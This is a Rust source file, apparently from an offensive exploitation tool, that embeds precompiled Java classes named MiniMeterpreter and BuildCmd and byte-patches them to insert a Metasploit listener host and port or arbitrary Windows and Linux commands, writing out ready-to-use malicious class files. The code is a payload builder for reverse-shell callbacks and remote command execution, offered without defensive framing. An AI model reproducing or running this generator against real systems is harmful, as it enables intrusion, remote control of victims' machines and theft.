use std::fs::File;
use std::error::Error;
use std::io::prelude::*;
use std::path::Path;

use crate::common::BuildCmdCfg;

static CMD_CLASS : &'static [u8] = include_bytes!("java/BuildCmd.class");
static MM_CLASS : &'static [u8] = include_bytes!("java/MiniMeterpreter.class");

struct Replacement{
    pub _from : String,
    pub _to : String,
    pub from_bytes : Vec<u8>,
    pub to_bytes : Vec<u8>,
}

impl Replacement{
    fn convert_to_bytes(s : &str) -> Vec<u8> {
        let mut data : Vec<u8> = vec![];        
        (s.len() as u16).to_be_bytes().into_iter().for_each(|b| data.push(b));
        s.as_bytes().iter().for_each(|b| data.push(*b));
        data
    }
    
    pub fn new(from : &str, to : &str) -> Replacement{
        Replacement{
            _to : to.to_string(),
            _from : from.to_string(),
            to_bytes : Replacement::convert_to_bytes(to),
            from_bytes : Replacement::convert_to_bytes(from)
        }
    }
}

fn replace_byte_seq(buf : &[ u8 ], replacements : &Vec<Replacement>)->Vec<u8>{
    let mut result : Vec<u8> = vec![];
    let mut cur : usize = 0;
    let end = buf.len();
    'outer: while cur < end {
        for r in replacements {
            if buf[cur..].starts_with(&r.from_bytes) {
                result.append(&mut r.to_bytes.clone());
                cur += r.from_bytes.len();
                continue 'outer;
            }
        }
        result.push(buf[cur]);
        cur += 1;
    }
    result
}

pub fn ensure_mm_class_exists(base_dir : &str, class_name : &str, msf_ip : &str, msf_port : &str) -> Result<(), Box<dyn Error>>{
    let java_file_path= Path::new(&base_dir).join(format!("{}.java", &class_name));
    if !java_file_path.exists() {
        return build_mm_class(base_dir, class_name, msf_ip, msf_port);
    }
    Ok(())
}

pub fn build_mm_class(base_dir : &str, class_name : &str, msf_host : &str, msf_port : &str) -> Result<(), Box<dyn Error>>{
    let replacements = vec![
        Replacement::new("MiniMeterpreter", &class_name),
        Replacement::new("MiniMeterpreter.java", &format!("{}.java", &class_name)),
        Replacement::new("HOST", &msf_host),
        Replacement::new("PORT", &msf_port),
    ];

    let the_class = replace_byte_seq(&MM_CLASS, &replacements);

    let java_file_path= Path::new(&base_dir).join(format!("{}.class", &class_name));
    let mut file = File::create(&java_file_path)?;
    file.write(&the_class)?;
    file.flush()?;
    Ok(())
}

pub fn build_exec_cmd_class(cfg : BuildCmdCfg) -> Result<(), Box<dyn Error>>{
    let replacements = vec![
        Replacement::new("BuildCmd", &cfg.class_name),
        Replacement::new("BuildCmd.java", &format!("{}.java", &cfg.class_name)),
        Replacement::new("WWWWW", &cfg.w_cmd),
        Replacement::new("LLLLL", &cfg.l_cmd),
    ];

    let the_class = replace_byte_seq(&CMD_CLASS, &replacements);
    
    let java_file_path= Path::new(&cfg.build_path).join(format!("{}.class", &cfg.class_name));
    let mut file = File::create(&java_file_path)?;
    file.write(&the_class)?;
    file.flush()?;
    Ok(())
}
